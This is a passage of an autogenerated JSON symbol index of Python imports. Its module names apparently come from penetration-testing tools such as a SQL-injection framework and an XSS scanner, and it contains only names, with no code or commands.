        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "importPath": "plugins.generic.fingerprint",
        "description": "plugins.generic.fingerprint",
        "isExtraImport": true,
        "detail": "plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "importPath": "plugins.generic.syntax",
        "description": "plugins.generic.syntax",
        "isExtraImport": true,
        "detail": "plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "importPath": "plugins.generic.takeover",
        "description": "plugins.generic.takeover",
        "isExtraImport": true,
        "detail": "plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "pivotDumpTable",
        "importPath": "lib.utils.pivotdumptable",
        "description": "lib.utils.pivotdumptable",
        "isExtraImport": true,
        "detail": "lib.utils.pivotdumptable",
        "documentation": {}
    },
    {
        "label": "pivotDumpTable",
        "importPath": "lib.utils.pivotdumptable",
        "description": "lib.utils.pivotdumptable",
        "isExtraImport": true,
        "detail": "lib.utils.pivotdumptable",
        "documentation": {}
    },
    {
        "label": "pivotDumpTable",
        "importPath": "lib.utils.pivotdumptable",
        "description": "lib.utils.pivotdumptable",
        "isExtraImport": true,
        "detail": "lib.utils.pivotdumptable",
        "documentation": {}
    },
    {
        "label": "pivotDumpTable",
        "importPath": "lib.utils.pivotdumptable",
        "description": "lib.utils.pivotdumptable",
        "isExtraImport": true,
        "detail": "lib.utils.pivotdumptable",
        "documentation": {}
    },
    {
        "label": "bannerParser",
        "importPath": "lib.parse.banner",
        "description": "lib.parse.banner",
        "isExtraImport": true,
        "detail": "lib.parse.banner",
        "documentation": {}
    },
    {
        "label": "Custom",
        "importPath": "plugins.generic.custom",
        "description": "plugins.generic.custom",
        "isExtraImport": true,
        "detail": "plugins.generic.custom",
        "documentation": {}
    },
    {
        "label": "Databases",
        "importPath": "plugins.generic.databases",
        "description": "plugins.generic.databases",
        "isExtraImport": true,
        "detail": "plugins.generic.databases",
        "documentation": {}
    },
    {
        "label": "Entries",
        "importPath": "plugins.generic.entries",
        "description": "plugins.generic.entries",
        "isExtraImport": true,
        "detail": "plugins.generic.entries",
        "documentation": {}
    },
    {
        "label": "Search",
        "importPath": "plugins.generic.search",
        "description": "plugins.generic.search",
        "isExtraImport": true,
        "detail": "plugins.generic.search",
        "documentation": {}
    },
    {
        "label": "Users",
        "importPath": "plugins.generic.users",
        "description": "plugins.generic.users",
        "isExtraImport": true,
        "detail": "plugins.generic.users",
        "documentation": {}
    },
    {
        "label": "Abstraction",
        "importPath": "lib.takeover.abstraction",
        "description": "lib.takeover.abstraction",
        "isExtraImport": true,
        "detail": "lib.takeover.abstraction",
        "documentation": {}
    },
    {
        "label": "ICMPsh",
        "importPath": "lib.takeover.icmpsh",
        "description": "lib.takeover.icmpsh",
        "isExtraImport": true,
        "detail": "lib.takeover.icmpsh",
        "documentation": {}
    },
    {
        "label": "Metasploit",
        "importPath": "lib.takeover.metasploit",
        "description": "lib.takeover.metasploit",
        "isExtraImport": true,
        "detail": "lib.takeover.metasploit",
        "documentation": {}
    },
    {
        "label": "Registry",
        "importPath": "lib.takeover.registry",
        "description": "lib.takeover.registry",
        "isExtraImport": true,
        "detail": "lib.takeover.registry",
        "documentation": {}
    },
    {
        "label": "base64,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "base64.",
        "description": "base64.",
        "detail": "base64.",
        "documentation": {}
    },
    {
        "label": "sys,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sys.",
        "description": "sys.",
        "detail": "sys.",
        "documentation": {}
    },
    {
        "label": "struct,",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "struct.",
        "description": "struct.",
        "detail": "struct.",
        "documentation": {}
    },
    {
        "label": "ssl",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ssl",
        "description": "ssl",
        "detail": "ssl",
        "documentation": {}
    },
    {
        "label": "os.path",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os.path",
        "description": "os.path",
        "detail": "os.path",
        "documentation": {}
    },
    {
        "label": "minidom",
        "importPath": "xml.dom",
        "description": "xml.dom",
        "isExtraImport": true,
        "detail": "xml.dom",
        "documentation": {}
    },
    {
        "label": "Node",
        "importPath": "xml.dom",
        "description": "xml.dom",
        "isExtraImport": true,
        "detail": "xml.dom",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "pyDes",
        "description": "pyDes",
        "isExtraImport": true,
        "detail": "pyDes",
        "documentation": {}
    },
    {
        "label": "ctypes",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ctypes",
        "description": "ctypes",
        "detail": "ctypes",
        "documentation": {}
    },
    {
        "label": "client",
        "importPath": "lib.utils.api",
        "description": "lib.utils.api",
        "isExtraImport": true,
        "detail": "lib.utils.api",
        "documentation": {}
    },
    {
        "label": "server",
        "importPath": "lib.utils.api",
        "description": "lib.utils.api",
        "isExtraImport": true,
        "detail": "lib.utils.api",
        "documentation": {}
    },
    {
        "label": "concurrent.futures",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "concurrent.futures",
        "description": "concurrent.futures",
        "detail": "concurrent.futures",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "red",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "yellow",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "red",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "yellow",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "white",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "yellow",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "que",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "info",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "good",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "que",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "green",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "end",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "red",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "white",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "bad",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "info",
        "importPath": "core.colors",
        "description": "core.colors",
        "isExtraImport": true,
        "detail": "core.colors",
        "documentation": {}
    },
    {
        "label": "core.config",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "core.config",
        "description": "core.config",
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "blindParams",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "threadCount",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "fuzzes",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "badTags",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "fillings",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "eFillings",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "lFillings",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "jFillings",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "eventHandlers",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "tags",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "functions",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "badTags",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "defaultEditor",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "changes",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "minEfficiency",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "blindPayload",
        "importPath": "core.config",
        "description": "core.config",
        "isExtraImport": true,
        "detail": "core.config",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "requester",
        "importPath": "core.requester",
        "description": "core.requester",
        "isExtraImport": true,
        "detail": "core.requester",
        "documentation": {}
    },
    {
        "label": "core.log",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "core.log",
        "description": "core.log",
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "importPath": "core.log",
        "description": "core.log",
        "isExtraImport": true,
        "detail": "core.log",
        "documentation": {}
    },
    {
        "label": "fuzz",
        "importPath": "fuzzywuzzy",
        "description": "fuzzywuzzy",
        "isExtraImport": true,
        "detail": "fuzzywuzzy",
        "documentation": {}
    },
    {
        "label": "urllib.parse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "unquote",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "unquote",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "unquote",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "quote",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "unquote",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
